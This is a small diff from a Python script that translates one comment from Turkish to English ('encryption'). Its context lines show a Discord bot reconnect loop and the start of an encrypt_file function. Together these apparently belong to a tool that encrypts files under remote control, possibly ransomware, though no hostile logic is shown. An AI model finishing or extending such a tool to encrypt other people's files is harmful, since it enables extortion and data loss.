@@ -86,7 +86,7 @@ async def start_discord_bot():
             print(f"[!] discord connect error {e}")
             await asyncio.sleep(10)
 
-# === Şifreleme ===
+# === encryption ===
 def encrypt_file(path):
     try:
         with open(path, "rb") as f:
